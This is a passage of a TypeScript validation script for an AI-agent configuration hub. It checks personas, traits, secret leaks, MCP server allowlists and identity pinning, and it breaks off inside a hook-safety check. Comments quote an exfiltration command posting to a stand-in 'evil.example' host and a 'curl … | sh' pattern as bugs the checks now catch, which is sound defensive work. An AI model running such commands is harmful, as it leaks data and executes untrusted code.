/**
 * AgentBoot validate script.
 *
 * Runs a suite of checks against the AgentBoot source tree and config before
 * a build is allowed to proceed. All checks are independent — every failure
 * is reported before the process exits.
 *
 * Checks:
 *   1. All personas in agentboot.config.json exist in core/personas/
 *   2. All traits referenced in persona configs exist in core/traits/
 *   3. All SKILL.md files have required frontmatter (name, description)
 *   4. No obvious secrets or credentials in trait/persona definitions
 *   5. Composition type consistency across scopes (AB-118)
 *   6. Rule override detection — lower scopes shadowing core rules (AB-119)
 *   7. MCP governance — approved/required server validation (AB-143)
 *   8. Artifact identity — every governed core/ artifact carries an id (decision-0005)
 *
 * Usage:
 *   npm run validate
 *   tsx scripts/validate.ts
 *   tsx scripts/validate.ts --config path/to/agentboot.config.json
 *   tsx scripts/validate.ts --strict   (treats warnings as errors)
 */

import fs from "node:fs";
import path from "node:path";
import { fileURLToPath } from "node:url";
import chalk from "chalk";
import {
  type AgentBootConfig,
  type PersonaConfig,
  resolveHubConfigOrExit,
  loadConfigOrExit,
  stripJsoncComments,
  traitRefsToNames,
  VALID_WEIGHT_NAMES,
} from "./lib/config.js";
import {
  parseFrontmatter,
  frontmatterBlock,
  DEFAULT_SECRET_PATTERNS,
  scanForSecrets,
  resolveCompositionType,
  type CompositionType,
} from "./lib/frontmatter.js";
import { loadExceptionsFile, validateExceptions, HUB_EXCEPTIONS_FILE } from "./lib/exceptions.js";
import { resolveDomainDirs, hubContentRoots } from "./lib/scope-layout.js";
import { dangerousHookFindings, unscannableHookEvents } from "./lib/hook-safety.js";
import { readScopeGlobs } from "./lib/scope-projection.js";
import { isSafeRelativeSegment } from "./lib/path-containment.js";
import { readIdentity, isValidId, isGovernedArtifact } from "./lib/artifact-identity.js";

// ---------------------------------------------------------------------------
// Paths
// ---------------------------------------------------------------------------

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const ROOT = path.resolve(__dirname, "..");

// ---------------------------------------------------------------------------
// Types
// ---------------------------------------------------------------------------

interface CheckResult {
  name: string;
  passed: boolean;
  warnings: string[];
  errors: string[];
}

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

function check(name: string): CheckResult {
  return { name, passed: true, warnings: [], errors: [] };
}

function fail(result: CheckResult, msg: string): void {
  result.errors.push(msg);
  result.passed = false;
}

function warn(result: CheckResult, msg: string): void {
  result.warnings.push(msg);
}

function printResult(result: CheckResult, strictMode: boolean): void {
  const effectivePassed = result.passed && (strictMode ? result.warnings.length === 0 : true);

  if (effectivePassed) {
    console.log(`  ${chalk.green("✓")} ${result.name}`);
  } else {
    console.log(`  ${chalk.red("✗")} ${result.name}`);
  }

  for (const err of result.errors) {
    console.log(chalk.red(`      ERROR: ${err}`));
  }

  for (const w of result.warnings) {
    const icon = strictMode ? chalk.red("WARN (strict)") : chalk.yellow("WARN");
    console.log(`      ${icon}: ${w}`);
  }
}

function isEffectiveFail(result: CheckResult, strictMode: boolean): boolean {
  if (!result.passed) return true;
  if (strictMode && result.warnings.length > 0) return true;
  return false;
}

// ---------------------------------------------------------------------------
// Check 1: Persona existence
// ---------------------------------------------------------------------------

function checkPersonaExistence(config: AgentBootConfig, configDir: string): CheckResult {
  const result = check("Persona existence — all enabled personas found in core/personas/");
  const enabledPersonas = config.personas?.enabled;

  if (!enabledPersonas || enabledPersonas.length === 0) {
    warn(result, "No personas enabled in config. Nothing will be compiled.");
    return result;
  }

  // Personas can come from three sources, merged into one set. Hub content
  // augments package content; hub names with the same id as a package
  // persona override (since both end up in the set, the compile step
  // resolves the override when it actually reads files).
  const packagePersonasDir = path.join(ROOT, "core", "personas");       // bundled defaults
  const hubPersonasDir = path.join(configDir, "core", "personas");      // hub-local additions
  const extendDir = config.personas?.customDir
    ? path.resolve(configDir, config.personas.customDir)
    : null;

  // Collect all available persona directories.
  const available = new Set<string>();

  for (const dir of [packagePersonasDir, hubPersonasDir, extendDir]) {
    if (!dir || !fs.existsSync(dir)) continue;
    for (const entry of fs.readdirSync(dir)) {
      if (fs.statSync(path.join(dir, entry)).isDirectory()) {
        available.add(entry);
      }
    }
  }

  for (const persona of enabledPersonas) {
    if (!available.has(persona)) {
      fail(
        result,
        `Persona "${persona}" is enabled in config but no directory found. ` +
          `Expected: core/personas/${persona}/ or ${config.personas?.customDir ?? "(no extend path)"}/${persona}/`
      );
    }
  }

  if (result.passed) {
    // Also warn about personas that exist but are not enabled.
    const disabled = [...available].filter((p) => !enabledPersonas.includes(p));
    if (disabled.length > 0) {
      warn(result, `Personas in core/ not enabled: ${disabled.join(", ")}`);
    }
  }

  return result;
}

// ---------------------------------------------------------------------------
// Check 2: Trait references
// ---------------------------------------------------------------------------

function checkTraitReferences(config: AgentBootConfig, configDir: string): CheckResult {
  const result = check(
    "Trait references — all persona.config.json trait entries exist in core/traits/ or configured domains"
  );

  // Traits come from the package bundle (defaults), the hub's own core/traits
  // (additions / overrides), and any config-referenced domain layers. Files
  // added later win by name (hub over package, domain over hub).
  const packageTraitsDir = path.join(ROOT, "core", "traits");
  const hubTraitsDir = path.join(configDir, "core", "traits");
  const enabledTraits = config.traits?.enabled;
  const domainDirs = resolveDomainDirs(config, configDir);

  // Collect available trait names from all sources.
  const availableTraits = new Set<string>();
  const traitDirs = [packageTraitsDir, hubTraitsDir];
  for (const d of domainDirs) {
    if (d.traitsDir) traitDirs.push(d.traitsDir);
  }
  for (const dir of traitDirs) {
    if (!fs.existsSync(dir)) continue;
    for (const file of fs.readdirSync(dir)) {
      if (file.endsWith(".md")) {
        availableTraits.add(path.basename(file, ".md"));
      }
    }
  }

  if (availableTraits.size === 0) {
    warn(result, "No trait files found in core/traits/. Trait injection will be skipped.");
    return result;
  }

  // Scan all persona.config.json files in the merged persona directories
  // (package defaults + hub additions + optional customDir + domain layers).
  const personaRoots: string[] = [
    path.join(ROOT, "core", "personas"),
    path.join(configDir, "core", "personas"),
  ];
  if (config.personas?.customDir) {
    const ext = path.resolve(configDir, config.personas.customDir);
    if (fs.existsSync(ext)) personaRoots.push(ext);
  }
  for (const d of domainDirs) {
    if (d.personasDir) personaRoots.push(d.personasDir);
  }

  for (const root of personaRoots) {
    if (!fs.existsSync(root)) continue;

    for (const personaName of fs.readdirSync(root)) {
      const personaDir = path.join(root, personaName);
      if (!fs.statSync(personaDir).isDirectory()) continue;

      const configPath = path.join(personaDir, "persona.config.json");
      if (!fs.existsSync(configPath)) continue;

      let personaConfig: PersonaConfig;
      try {
        personaConfig = JSON.parse(stripJsoncComments(fs.readFileSync(configPath, "utf-8"))) as PersonaConfig;
      } catch {
        fail(result, `[${personaName}] persona.config.json is not valid JSON`);
        continue;
      }

      // AB-161: Validate pattern field
      const validPatterns = ["react", "rewoo", "router", "sequential", "tool-calling"];
      if (personaConfig.pattern !== undefined) {
        if (!validPatterns.includes(personaConfig.pattern)) {
          fail(
            result,
            `[${personaName}] Invalid pattern "${personaConfig.pattern}". ` +
              `Valid values: ${validPatterns.join(", ")}`
          );
        }
        if (personaConfig.pattern === "router" && !personaConfig.description?.toLowerCase().includes("orchestrat")) {
          warn(result, `[${personaName}] pattern "router" is typically used for orchestrator personas`);
        }
      }

      // Collect all trait references in this persona config (supports both array and object formats).
      const traitRefs = new Set<string>();
      if (personaConfig.traits) {
        for (const t of traitRefsToNames(personaConfig.traits)) traitRefs.add(t);
      }
      for (const g of Object.values(personaConfig.groups ?? {})) {
        if (g.traits) {
          for (const t of traitRefsToNames(g.traits)) traitRefs.add(t);
        }
      }
      for (const tm of Object.values(personaConfig.teams ?? {})) {
        if (tm.traits) {
          for (const t of traitRefsToNames(tm.traits)) traitRefs.add(t);
        }
      }

      // AB-134: Validate weight values when traits are specified as an object.
      const allTraitSources: Array<{ label: string; refs: PersonaConfig["traits"] }> = [
        { label: "traits", refs: personaConfig.traits },
      ];
      for (const [gName, g] of Object.entries(personaConfig.groups ?? {})) {
        allTraitSources.push({ label: `groups.${gName}.traits`, refs: g.traits });
      }
      for (const [tName, tm] of Object.entries(personaConfig.teams ?? {})) {
        allTraitSources.push({ label: `teams.${tName}.traits`, refs: tm.traits });
      }

      for (const { label, refs } of allTraitSources) {
        if (!refs || Array.isArray(refs)) continue;
        for (const [traitName, weightVal] of Object.entries(refs)) {
          if (typeof weightVal === "string") {
            if (!VALID_WEIGHT_NAMES.has(weightVal.toUpperCase())) {
              fail(
                result,
                `[${personaName}] ${label}["${traitName}"] has invalid weight "${weightVal}". ` +
                  `Valid values: ${[...VALID_WEIGHT_NAMES].join(", ")} or a number 0.0–1.0`
              );
            }
          } else if (typeof weightVal === "number") {
            if (weightVal < 0.0 || weightVal > 1.0) {
              fail(
                result,
                `[${personaName}] ${label}["${traitName}"] has out-of-range weight ${weightVal}. Must be 0.0–1.0`
              );
            }
          } else if (typeof weightVal !== "boolean") {
            fail(
              result,
              `[${personaName}] ${label}["${traitName}"] has unsupported weight type: ${typeof weightVal}`
            );
          }
        }
      }

      for (const traitRef of traitRefs) {
        if (!availableTraits.has(traitRef)) {
          fail(
            result,
            `[${personaName}] References trait "${traitRef}" which does not exist in core/traits/ or any configured domain`
          );
        } else if (enabledTraits && !enabledTraits.includes(traitRef)) {
          warn(
            result,
            `[${personaName}] References trait "${traitRef}" which exists but is not in traits.enabled`
          );
        }
      }
    }
  }

  return result;
}

// ---------------------------------------------------------------------------
// Check 3: SKILL.md frontmatter
// ---------------------------------------------------------------------------

function checkSkillFrontmatter(config: AgentBootConfig, configDir: string): CheckResult {
  const result = check("SKILL.md frontmatter — required fields present (name, description)");

  const personaRoots: string[] = [
    path.join(ROOT, "core", "personas"),
    path.join(configDir, "core", "personas"),
  ];
  if (config.personas?.customDir) {
    const ext = path.resolve(configDir, config.personas.customDir);
    if (fs.existsSync(ext)) personaRoots.push(ext);
  }
  for (const d of resolveDomainDirs(config, configDir)) {
    if (d.personasDir) personaRoots.push(d.personasDir);
  }

  let skillsChecked = 0;

  for (const root of personaRoots) {
    if (!fs.existsSync(root)) continue;

    for (const personaName of fs.readdirSync(root)) {
      const personaDir = path.join(root, personaName);
      if (!fs.statSync(personaDir).isDirectory()) continue;

      const skillPath = path.join(personaDir, "SKILL.md");
      if (!fs.existsSync(skillPath)) {
        warn(result, `[${personaName}] No SKILL.md found`);
        continue;
      }

      skillsChecked++;
      const content = fs.readFileSync(skillPath, "utf-8");
      const fields = parseFrontmatter(content);

      if (!fields) {
        fail(
          result,
          `[${personaName}] SKILL.md has no frontmatter block (expected ---\\n...\\n--- at top of file)`
        );
        continue;
      }

      if (!fields.has("name") || fields.get("name") === "") {
        fail(result, `[${personaName}] SKILL.md frontmatter missing required field: name`);
      }
      if (!fields.has("description") || fields.get("description") === "") {
        fail(result, `[${personaName}] SKILL.md frontmatter missing required field: description`);
      }
    }
  }

  if (skillsChecked === 0) {
    warn(result, "No SKILL.md files found. Has the persona directory been populated?");
  }

  return result;
}

// ---------------------------------------------------------------------------
// Check 4: Secret / credential scan
// ---------------------------------------------------------------------------

/**
 * Detect regex patterns likely to cause catastrophic backtracking.
 * Rejects patterns with nested quantifiers like (a+)+, (a*)*b, etc.
 */
export function isUnsafeRegex(pattern: string): boolean {
  // Reject patterns longer than 200 chars
  if (pattern.length > 200) return true;
  // Reject nested quantifiers: (x+)+, (x*)+, (x+)*, (x{n,})+, etc.
  if (/\([^)]*[+*][^)]*\)[+*{]/.test(pattern)) return true;
  // Reject patterns with multiple adjacent overlapping quantifiers
  if (/[+*]{2,}/.test(pattern)) return true;
  return false;
}

export function buildSecretPatterns(config: AgentBootConfig): RegExp[] {
  const configPatterns: RegExp[] = [];
  for (const p of config.validation?.secretPatterns ?? []) {
    if (isUnsafeRegex(p)) {
      console.error(`  ⚠ Rejected secretPattern "${p.slice(0, 50)}..." — potential catastrophic backtracking`);
      continue;
    }
    try {
      configPatterns.push(new RegExp(p));
    } catch (e: unknown) {
      console.error(`  ⚠ Invalid secretPattern regex "${p}": ${e instanceof Error ? e.message : String(e)} — skipping`);
    }
  }
  return [...DEFAULT_SECRET_PATTERNS, ...configPatterns];
}

function checkNoSecrets(config: AgentBootConfig, configDir: string): CheckResult {
  const result = check("Secret scan — no credentials or keys anywhere in the hub content surface");
  const patterns = buildSecretPatterns(config);

  // Scan the FULL compiler input surface (scope-layout SSOT): core/ (traits,
  // personas, instructions, gotchas, lexicon), groups/, teams/, nodes/, custom
  // persona dirs, and referenced domains. Scanning less than the compiler
  // reads means a credential in an unscanned dir passes "✓ Secret scan" and
  // syncs to every spoke in cleartext.
  const scanRoots = hubContentRoots(config, configDir);

  const scanFile = (filePath: string): void => {
    if (!fs.existsSync(filePath)) return;
    const content = fs.readFileSync(filePath, "utf-8");
    const hits = scanForSecrets(content, patterns);
    for (const hit of hits) {
      fail(
        result,
        // Relative to the hub being validated, not the installed package dir —
        // otherwise a secret finding is reported at a path like
        // "../../../../../Users/<name>/hub/core/x.md", which is the hardest
        // possible thing to act on in the one message that most needs acting on.
        `Potential secret at ${path.relative(configDir, filePath)}:${hit.line} ` +
          `(matched pattern: ${hit.pattern})`
      );
    }
  };

  for (const root of scanRoots) {
    if (!fs.existsSync(root)) continue;
    // Recursively find all .md, .json and .yaml files.
    for (const filePath of walkDir(root, [".md", ".json", ".yaml", ".yml"])) scanFile(filePath);
  }

  // Scan agentboot.config.json itself: telemetry.sink.headers (and any other
  // literal in the config) get compiled into synced artifacts (telemetry-sink.json)
  // and shipped to every spoke — a literal token here leaks exactly like one in
  // a content file. Use "$VAR" indirection instead; those are not secrets.
  scanFile(path.join(configDir, "agentboot.config.json"));

  // A telemetry sink header whose value is a literal (not a "$VAR" env
  // reference) is a credential baked into synced config — call it out.
  for (const [k, v] of Object.entries(config.telemetry?.sink?.headers ?? {})) {
    if (typeof v === "string" && v.length > 0 && !v.startsWith("$")) {
      fail(result,
        `telemetry.sink.headers["${k}"] is a literal value — use "$ENV_VAR" indirection so the ` +
        `credential is not compiled into telemetry-sink.json and synced to every spoke`);
    }
  }

  return result;
}

// ---------------------------------------------------------------------------
// Check 5: Composition type consistency across scopes (AB-118)
// ---------------------------------------------------------------------------

function checkCompositionConsistency(config: AgentBootConfig, configDir: string): CheckResult {
  const result = check("Composition consistency — no scope conflicts between rule/preference");
  const coreDir = path.join(configDir, "core");
  const groupsDir = path.join(configDir, "groups");
  const teamsDir = path.join(configDir, "teams");

  // Build map: relativePath → { scope, compositionType }[]
  const artifacts = new Map<string, Array<{ scope: string; comp: CompositionType; fullPath: string }>>();

  function scanScope(dir: string, scopeLabel: string): void {
    if (!fs.existsSync(dir)) return;
    for (const file of walkDir(dir, [".md", ".yaml", ".yml"])) {
      const relativePath = path.relative(dir, file).replace(/\\/g, "/");
      const content = fs.readFileSync(file, "utf-8");
      const fm = parseFrontmatter(content);
      const comp = resolveCompositionType(
        relativePath,
        fm,
        config.composition?.overrides as Record<string, CompositionType> | undefined,
        config.composition?.defaults as Record<string, CompositionType> | undefined,
      );
      const list = artifacts.get(relativePath) ?? [];
      list.push({ scope: scopeLabel, comp, fullPath: file });
      artifacts.set(relativePath, list);
    }
  }

  scanScope(coreDir, "core");

  // Scan groups
  if (fs.existsSync(groupsDir)) {
    for (const group of fs.readdirSync(groupsDir)) {
      const groupPath = path.join(groupsDir, group);
      if (fs.statSync(groupPath).isDirectory()) {
        scanScope(groupPath, `groups/${group}`);
      }
    }
  }

  // Scan teams
  if (fs.existsSync(teamsDir)) {
    for (const group of fs.readdirSync(teamsDir)) {
      const groupPath = path.join(teamsDir, group);
      if (!fs.statSync(groupPath).isDirectory()) continue;
      for (const team of fs.readdirSync(groupPath)) {
        const teamPath = path.join(groupPath, team);
        if (fs.statSync(teamPath).isDirectory()) {
          scanScope(teamPath, `teams/${group}/${team}`);
        }
      }
    }
  }

  // Check for conflicts: lower scope declares "preference" when higher scope declares "rule"
  const SCOPE_ORDER: Record<string, number> = {};
  // core = 0, groups/* = 1, teams/*/* = 2
  for (const [relativePath, entries] of artifacts) {
    if (entries.length < 2) continue; // single scope, no conflict

    for (const entry of entries) {
      if (entry.scope === "core") SCOPE_ORDER[entry.scope] = 0;
      else if (entry.scope.startsWith("groups/")) SCOPE_ORDER[entry.scope] = 1;
      else if (entry.scope.startsWith("teams/")) SCOPE_ORDER[entry.scope] = 2;
    }

    // Find rule declarations at higher (lower number) scopes
    const ruleScopes = entries.filter(e => e.comp === "rule");
    const prefScopes = entries.filter(e => e.comp === "preference");

    for (const rule of ruleScopes) {
      const ruleLevel = SCOPE_ORDER[rule.scope] ?? 99;
      for (const pref of prefScopes) {
        const prefLevel = SCOPE_ORDER[pref.scope] ?? 99;
        if (prefLevel > ruleLevel) {
          warn(
            result,
            `${relativePath}: ${pref.scope} declares "preference" but ${rule.scope} declares "rule" — ` +
            `the rule-type (${rule.scope}) will take precedence during sync`
          );
        }
      }
    }
  }

  return result;
}

// ---------------------------------------------------------------------------
// Check 6: Rule override detection (AB-119)
// ---------------------------------------------------------------------------

function checkRuleOverrides(config: AgentBootConfig, configDir: string): CheckResult {
  const result = check("Rule overrides — no lower-scope shadows of rule-type artifacts");
  const coreDir = path.join(configDir, "core");
  const groupsDir = path.join(configDir, "groups");
  const teamsDir = path.join(configDir, "teams");

  // Find all rule-type artifacts at core scope
  const coreRules = new Map<string, string>(); // relativePath → fullPath
  if (fs.existsSync(coreDir)) {
    for (const file of walkDir(coreDir, [".md", ".yaml", ".yml"])) {
      const relativePath = path.relative(coreDir, file).replace(/\\/g, "/");
      const content = fs.readFileSync(file, "utf-8");
      const fm = parseFrontmatter(content);
      const comp = resolveCompositionType(
        relativePath,
        fm,
        config.composition?.overrides as Record<string, CompositionType> | undefined,
        config.composition?.defaults as Record<string, CompositionType> | undefined,
      );
      if (comp === "rule") {
        coreRules.set(relativePath, file);
      }
    }
  }

  if (coreRules.size === 0) return result;

  // Check groups for shadows
  if (fs.existsSync(groupsDir)) {
    for (const group of fs.readdirSync(groupsDir)) {
      const groupPath = path.join(groupsDir, group);
      if (!fs.statSync(groupPath).isDirectory()) continue;
      for (const file of walkDir(groupPath, [".md", ".yaml", ".yml"])) {
        const relativePath = path.relative(groupPath, file).replace(/\\/g, "/");
        if (coreRules.has(relativePath)) {
          warn(
            result,
            `groups/${group}/${relativePath} shadows a rule-type artifact in core/ — ` +
            `the core version will take precedence during sync`
          );
        }
      }
    }
  }

  // Check teams for shadows
  if (fs.existsSync(teamsDir)) {
    for (const group of fs.readdirSync(teamsDir)) {
      const groupPath = path.join(teamsDir, group);
      if (!fs.statSync(groupPath).isDirectory()) continue;
      for (const team of fs.readdirSync(groupPath)) {
        const teamPath = path.join(groupPath, team);
        if (!fs.statSync(teamPath).isDirectory()) continue;
        for (const file of walkDir(teamPath, [".md", ".yaml", ".yml"])) {
          const relativePath = path.relative(teamPath, file).replace(/\\/g, "/");
          if (coreRules.has(relativePath)) {
            warn(
              result,
              `teams/${group}/${team}/${relativePath} shadows a rule-type artifact in core/ — ` +
              `the core version will take precedence during sync`
            );
          }
        }
      }
    }
  }

  return result;
}

function walkDir(dir: string, extensions: string[]): string[] {
  const results: string[] = [];
  if (!fs.existsSync(dir)) return results;

  for (const entry of fs.readdirSync(dir)) {
    const full = path.join(dir, entry);
    const stat = fs.statSync(full);
    if (stat.isDirectory()) {
      results.push(...walkDir(full, extensions));
    } else if (extensions.some((ext) => full.endsWith(ext))) {
      results.push(full);
    }
  }

  return results;
}

// ---------------------------------------------------------------------------
// Check: artifact identity (decision-0005)
// ---------------------------------------------------------------------------

/**
 * Every governed artifact under core/ carries a permanent id.
 *
 * WHY THIS IS A HARD ERROR AND NOT A WARNING. An identifier's entire value is
 * that it predates the question being asked of it, and identity cannot be
 * minted into the past: an artifact stamped today can only ever claim to date
 * from today, and everything before is forensic reconstruction from git history
 * and fuzzy content matching. So an artifact that reaches a release unstamped
 * is not "missing a field" — it is permanently unattributable. A warning gets
 * scrolled past; that is how nine of eighteen artifacts came to be unstamped
 * with the module, the ratified shape and the backfill command all in place and
 * nothing in the build ever asking.
 *
 * Duplicates are the same class from the other side: two artifacts sharing an
 * id silently merge their histories forever, and the merge is undetectable
 * afterwards because both files look correctly stamped. `identity` already
 * refuses to MINT a duplicate; nothing checked the corpus at rest, so a
 * copy-paste of a stamped file defeated that guard entirely.
 *
 * WHY A MISSING ID IS AN ERROR HERE AND A WARNING IN AN ADOPTER'S HUB. The
 * one-way door is *this package's* 1.0 tag: it freezes the lineage of the
 * artifacts AgentBoot itself ships, and those are the ones that can never be
 * stamped afterwards. An adopting hub has its own corpus on its own timeline,
 * and a gate that refuses to validate a gotcha someone wrote sixty seconds ago
 * is not governance — it is a build break on the authoring path, arriving
 * before the author has any reason to care about lineage. NF4-8 already pinned
 * the invariant that `validate` and `build` reach the same verdict on a
 * hand-authored artifact; erroring here would break it for every adopter, to
 * enforce a decision this project made about its own release. So: ERROR on the
 * corpus whose tag is at stake, WARN (which `--strict` escalates) elsewhere.
 *
 * Malformed and duplicate ids are errors EVERYWHERE — those are corruption
 * rather than absence, and a duplicate merges two histories no matter whose
 * hub it happens in.
 */
export function checkArtifactIdentity(
  configDir: string,
  // Is this the packaged corpus — the one whose lineage the release tag
  // freezes? Defaulted rather than derived inside so both branches are
  // reachable from a test; a severity switch only one side of which can ever
  // execute is indistinguishable from no switch at all.
  isPackagedCorpus: boolean = path.resolve(configDir) === path.resolve(ROOT)
): CheckResult {
  const result = check("Artifact identity — every governed artifact under core/ carries an id");
  const coreDir = path.join(configDir, "core");

  if (!fs.existsSync(coreDir)) {
    // Not a failure — a hub may legitimately carry no core/ of its own. But it
    // is not a pass either: say so, rather than printing a green tick over a
    // check that inspected nothing.
    warn(result, `No core/ directory at ${coreDir} — identity gate inspected 0 artifacts.`);
    return result;
  }

  const artifacts = walkDir(coreDir, [".md"]).filter((f) => isGovernedArtifact(f));

  if (artifacts.length === 0) {
    warn(result, "core/ contains no governed artifacts — identity gate inspected 0 artifacts.");
    return result;
  }

  const byId = new Map<string, string>();
  const unstamped: string[] = [];

  for (const file of artifacts.sort()) {
    const rel = path.relative(configDir, file);
    const identity = readIdentity(fs.readFileSync(file, "utf-8"));

    if (!identity.id) {
      unstamped.push(rel);
      continue;
    }
    if (!isValidId(identity.id)) {
      fail(result, `${rel} has a malformed \`id: ${identity.id}\` — expected a 26-char ULID.`);
      continue;
    }

    const prior = byId.get(identity.id);
    if (prior) {
      fail(
        result,
        `${rel} shares \`id: ${identity.id}\` with ${prior} — a duplicate id merges two ` +
          `artifacts' histories permanently. One of them needs a fresh id.`
      );
      continue;
    }
    byId.set(identity.id, rel);
  }

  for (const rel of unstamped) {
    const msg =
      `${rel} has no \`id:\` — decision-0005 requires a permanent identifier on every ` +
      `governed artifact, and an id cannot be minted into the past. Run \`agentboot identity\`.`;
    if (isPackagedCorpus) fail(result, msg);
    else warn(result, msg);
  }

  return result;
}

// ---------------------------------------------------------------------------
// AB-143: Check 7: MCP connection governance
// ---------------------------------------------------------------------------

function checkMcpGovernance(config: AgentBootConfig): CheckResult {
  const result = check("MCP governance — approved servers and required servers validated");
  const mcpConfig = config.mcp;

  if (!mcpConfig) {
    // No MCP governance configured — skip silently
    return result;
  }

  // Validate approved servers have names
  if (mcpConfig.approved) {
    for (const server of mcpConfig.approved) {
      if (!server.name || server.name.trim() === "") {
        fail(result, "MCP approved server entry missing 'name' field");
      }
    }
  }

  // R2-4: validate required servers are in the approved list.
  //
  // The guard used to be `if (mcpConfig.required && mcpConfig.approved)`, so the
  // check could only run when an approved list already existed — i.e. it was
  // disabled by the absence of the very thing it compares against. `required:
  // ["vault"]` with NO `approved` list is the worst state (nothing is approved,
  // so the required server cannot be), and it was the one state that produced no
  // finding at all, under a green `✓ … required servers validated`.
  if (mcpConfig.required?.length) {
    const approvedNames = new Set((mcpConfig.approved ?? []).map(s => s.name));
    for (const required of mcpConfig.required) {
      if (!approvedNames.has(required)) {
        fail(
          result,
          `MCP required server "${required}" is not in the approved servers list` +
          (mcpConfig.approved ? "" : " (mcp.approved is not configured at all)")
        );
      }
    }
  }

  // Validate that claude.mcpServers entries match approved list (if enforceApproved).
  //
  // NF3-1: the THIRD instance of R2-4's shape, in the same function, left
  // unfixed when the two `required` guards above were corrected. The guard was
  //
  //     if (mcpConfig.enforceApproved && config.claude?.mcpServers && mcpConfig.approved)
  //
  // — gated on `approved` being present. So `enforceApproved: true` with NO
  // approved list, which is the state in which NOTHING is approved and therefore
  // EVERY configured server is unapproved, was the one state that produced no
  // finding, under `✓ MCP governance — approved servers and required servers
  // validated`. Reproduced against the real CLI: an `exfil` server running
  // `curl -X POST https://evil.example/steal` passed validate and was written
  // verbatim into dist/claude/core/.mcp.json.
  //
  // FAIL CLOSED on missing data: an absent approved list is an EMPTY approved
  // list. `enforceApproved` is a narrowing directive; an unreadable/absent
  // allowlist must narrow to nothing, never widen to everything.
  if (mcpConfig.enforceApproved && config.claude?.mcpServers) {
    const approvedByName = new Map((mcpConfig.approved ?? []).map(s => [s.name, s]));
    for (const [serverName, rawEntry] of Object.entries(config.claude.mcpServers)) {
      const approved = approvedByName.get(serverName);
      if (!approved) {
        fail(
          result,
          `MCP server "${serverName}" in claude.mcpServers is not in the approved list. ` +
          `Add it to mcp.approved or remove enforceApproved.` +
          (mcpConfig.approved ? "" : " (mcp.approved is not configured at all, so nothing is approved)")
        );
        continue;
      }

      // B5: identity pinning — an approved NAME must not front an unapproved
      // implementation. Whatever identity fields the approved entry pins
      // (command, args, url, transport) must match the configured server exactly.
      const entry = (rawEntry ?? {}) as Record<string, unknown>;
      if (approved.command !== undefined && entry["command"] !== approved.command) {
        fail(
          result,
          `MCP server "${serverName}": configured command "${String(entry["command"] ?? "(none)")}" does not match ` +
          `the approved command "${approved.command}" — an approved name may not run a different executable.`
        );
      }
      if (approved.args !== undefined) {
        const configuredArgs = Array.isArray(entry["args"]) ? (entry["args"] as unknown[]).map(String) : [];
        const match = configuredArgs.length === approved.args.length &&
          configuredArgs.every((a, i) => a === approved.args![i]);
        if (!match) {
          fail(
            result,
            `MCP server "${serverName}": configured args [${configuredArgs.join(", ")}] do not match ` +
            `the approved args [${approved.args.join(", ")}] — pin drift or substitution.`
          );
        }
      }
      if (approved.url !== undefined && entry["url"] !== approved.url) {
        fail(
          result,
          `MCP server "${serverName}": configured url "${String(entry["url"] ?? "(none)")}" does not match the approved url "${approved.url}".`
        );
      }
      if (approved.transport !== undefined) {
        const configuredTransport = entry["transport"] ?? entry["type"] ?? (entry["url"] ? "sse" : "stdio");
        if (configuredTransport !== approved.transport) {
          fail(
            result,
            `MCP server "${serverName}": configured transport "${String(configuredTransport)}" does not match the approved transport "${approved.transport}".`
          );
        }
      }
    }
  }

  // R2-4: warn about required servers not configured.
  //
  // Same inversion as above, and sharper: the guard was
  // `if (mcpConfig.required && config.claude?.mcpServers)`, so the check ran only
  // when SOME servers were already configured. A hub declaring
  // `mcp.required: ["vault"]` and configuring no mcpServers at all — zero of the
  // required servers present, the maximum shortfall — fell straight through and
  // printed `✓ MCP governance — approved servers and required servers validated`.
  // A check that switches itself off precisely when it would fire is not a check.
  if (mcpConfig.required?.length) {
    const configured = new Set(Object.keys(config.claude?.mcpServers ?? {}));
    for (const required of mcpConfig.required) {
      if (!configured.has(required)) {
        warn(
          result,
          `MCP required server "${required}" is not configured in claude.mcpServers` +
          (config.claude?.mcpServers ? "" : " (no claude.mcpServers are configured at all)")
        );
      }
    }
  }

  return result;
}

// ---------------------------------------------------------------------------
// v0.19.0: MCP digest-pinning coverage (warn-only — incremental adoption)
// ---------------------------------------------------------------------------

export function checkMcpPinning(config: AgentBootConfig): CheckResult {
  const result = check("MCP digest pinning — approved servers carry toolsDigest + registry provenance");
  const mcpConfig = config.mcp;

  // Only meaningful when the org actually enforces the approved list.
  if (!mcpConfig?.enforceApproved || !mcpConfig.approved) return result;

  for (const server of mcpConfig.approved) {
    // Name-only entries have no transport to hash — the identity-pinning check
    // (checkMcpGovernance) already flags those as the weaker legacy form.
    if (!server.command && !server.url) continue;

    if (!server.toolsDigest) {
      warn(
        result,
        `MCP approved server "${server.name}" has no toolsDigest — a mutable server can change its ` +
          `tool definitions (the rug-pull class) under this approved name without failing any check. ` +
          `Record a pin with \`agentboot mcp-pin --server ${server.name} --write\`.`
      );
    }
    if (!server.registry) {
      warn(
        result,
        `MCP approved server "${server.name}" has no registry provenance — set mcp.approved[].registry ` +
          `(e.g. "official-registry:<namespace>", "vetted:<name>", or "unvetted") so reviewers know ` +
          `where this server reference came from.`
      );
    }
  }

  return result;
}

// ---------------------------------------------------------------------------
// B1: claude.settings pass-through hygiene
// ---------------------------------------------------------------------------

function checkClaudeSettingsPassthrough(config: AgentBootConfig): CheckResult {
  const result = check("claude.settings pass-through — no collisions with dedicated keys");
  const settings = config.claude?.settings;
  if (!settings) return result;

  // These have dedicated, validated config surfaces — passing them through raw
  // would silently bypass that validation (and the dedicated key wins at emit,
  // so the pass-through copy would be dead config).
  const dedicated: Record<string, string> = {
    permissions: "claude.permissions",
    hooks: "claude.hooks",
    mcpServers: "claude.mcpServers",
  };
  for (const key of Object.keys(settings)) {
    if (dedicated[key]) {
      fail(
        result,
        `claude.settings.${key} collides with the dedicated config key ${dedicated[key]} — use that instead`
      );
    }
  }
  return result;
}

// ---------------------------------------------------------------------------
// I2 / D.1: dangerous org-authored hook commands
// ---------------------------------------------------------------------------

/**
 * The patterns live in scripts/lib/hook-safety.ts, NOT here, because `build` and
 * `sync` never call validate — a hub author's `curl … | sh` reached the spoke's
 * non-overridable managed-settings channel with both commands exiting 0. The
 * compiler enforces the same list at the same severity; this is the report.
 */
function checkDangerousHooks(config: AgentBootConfig, configDir: string): CheckResult {
  // NF3-2: the check NAME used to be "claude.hooks — …", and so did its input.
  // Persona-level `hooks` in persona.config.json are the second author-controlled
